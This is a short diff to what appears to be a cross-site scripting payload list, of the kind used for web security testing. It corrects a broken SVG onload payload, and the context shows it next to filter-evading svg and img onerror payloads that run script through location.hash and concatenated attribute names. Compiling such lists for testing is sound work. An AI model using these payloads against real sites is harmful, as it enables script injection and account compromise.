@@ -9,7 +9,8 @@ frames
 content
 windiow
 <svg/onload=location=location.hash.substr(1)>#javascript:alert(1)
-<svg onload=eval(location.hash.slice(1)>#alert(1)
+<svg/onload=eval(location.hash.slice(1))>#alert(1)
+
 
 <img src=1 a=al c=ert onerror=top[a%2bc](0)>
 <img src=1 alt=al lang=ert onerror=top[alt%2blang](0)>
